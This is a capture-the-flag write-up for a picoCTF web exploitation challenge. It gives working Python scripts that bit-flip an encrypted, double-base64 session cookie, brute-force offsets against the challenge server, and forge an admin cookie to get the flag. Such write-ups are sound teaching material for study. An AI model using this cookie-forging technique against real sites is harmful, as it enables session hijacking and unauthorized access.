 # Introduction
## Problem Details

Category: Web Exploitation
Points: 90
#### Description

I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!  [http://mercury.picoctf.net:56136/](http://mercury.picoctf.net:56136/)

## Writeup
This was a *very* difficult problem, especially given the 90 point value. I was the 11th person to solve this problem. The basis of this problem is homomorphic encryption, where we can perform arbitrary bit flips of ciphertext which are mirrored in the plaintext. This is similar to an AES-CBC problem from picoCTF 2019 but unfortunately I can't find the exact problem. I wrote a program to perform arbitrary bit flips on the given cookie:

```py
import requests
import base64
import itertools

# For some reason, the cookie is base64-ed twice, I don't know why
cookie = "SDZPcDlsczNHU1pnS09ad0ZZUWNHcDdVNmVQRkxpZ3lrVW5iK0x1allpNjgzSzFSbXphamFxV3Z1eWJFb05Nek9hZmVJbFZXWU5sR1JzM1BURmczODJTRGk0djYyeWxVUUZqckNGMytRY0VFV0xDdHJyYTRtd2dDTSt3WjBiMFk="
b64d = base64.b64decode(cookie)
twiceb64d = base64.b64decode(b64d)

# Helper function from StackOverflow
def bitstring_to_bytes(s):
    v = int(s, 2)
    b = bytearray()
    while v:
        b.append(v & 0xff)
        v >>= 8
    return bytes(b[::-1])


def checkCookie(cookie_new):
    # Submit the forged cookie and check if we hit a 500 
    # Originally this didn't check for "Unauthenticated search." because that was how I identified the valid offsets originally
    txt = requests.post("http://mercury.picoctf.net:56136/search", data={
        'cookie': 'snickerdoodle'
    }, headers={
        "Cookie": f"auth_name={cookie_new}"
    }).content.decode('utf-8')
    return "500" not in txt and "Unauthenticated search." not in txt


def check(length, i, v=False):
    # Conert cookie to binary
    cookie_new = ''.join(map(lambda x: bin(x)[2:].zfill(8), twiceb64d))
    cookie_new = list(cookie_new)
    # Toggle relevant bits
    for idx in range(i, min(i + length, len(twiceb64d))):
        cookie_new[idx] = str(1 - int(cookie_new[idx]))
    # Convert cookie back to base64 twice
    real_cookie = bitstring_to_bytes(''.join(cookie_new))
    real_cookie = base64.b64encode(base64.b64encode(real_cookie)).decode('utf-8')
    try:
        worked = checkCookie(real_cookie)
        if v:
            print(requests.post("http://mercury.picoctf.net:56136/search", data={
                'cookie': 'snickerdoodle'
            }, headers={
                "Cookie": f"auth_name={real_cookie}"
            }).content.decode('utf-8'))
        print(f"{str(length).zfill(2)} || {str(i).zfill(2)}")
        if worked:
            print(f"{str(length).zfill(2)} || {str(i).zfill(2)} | worked!")

    except Exception as e:
        print(f"{str(length).zfill(2)} || {str(i).zfill(2)}: #FAILED")
        print(e)
```
I ran the function in a for loop to check for all possible lengths 1-10 and all possible offsets. I found the following valid offsets (toggling these number of bits cause an `Unauthorized search` instead of a 500):
```
    # 1 @ 76
    # 1 @ 77
    # 1 @ 78
    # 1 @ 79
    # 2 @ 67
    # 2 @ 77
    # 2 @ 78
    # 3 @ 77
```

Then, I ran another test to determine which bit patterns created an admin cookie using all possible bit patterns:

```py
    valid_offsets = [
        (1, 76),
        (1, 77),
        (1, 78),
        (1, 79),
        (2, 67),
        (2, 77),
        (2, 78),
        (3, 77)
    ]

    for i in valid_offsets:
        possible_bit_patterns = map(lambda x: list(map(str, x)), itertools.product(*[[0, 1]] * i[0]))
        print(f"{i[0]} || {i[1]}")
        print("=================")

        for pattern in possible_bit_patterns:
            cookie_new = ''.join(map(lambda x: bin(x)[2:].zfill(8), twiceb64d))
            cookie_new = list(cookie_new)
            for idx in range(i[1], min(i[1] + i[0], len(twiceb64d))):
                cookie_new[idx] = pattern[idx - i[1]]

            real_cookie = bitstring_to_bytes(''.join(cookie_new))
            real_cookie = base64.b64encode(base64.b64encode(real_cookie)).decode('utf-8')
            try:
                worked = checkCookie(real_cookie)
                if worked:
                    print(real_cookie)
                    print(requests.post("http://mercury.picoctf.net:56136/search", data={
                        'cookie': 'snickerdoodle'
                    }, headers={
                        "Cookie": f"auth_name={real_cookie}"
                    }).content.decode('utf-8'))

            except Exception as e:
                print(f"{''.join(pattern)} || #FAILED")
                print(e)
```

I was able to identify `(1, 79)` as the appropriate offset. So I took the cookie, copy-pasted it into my browser, and loaded [http://mercury.picoctf.net:56136/](http://mercury.picoctf.net:56136/), and was redirected to the flag.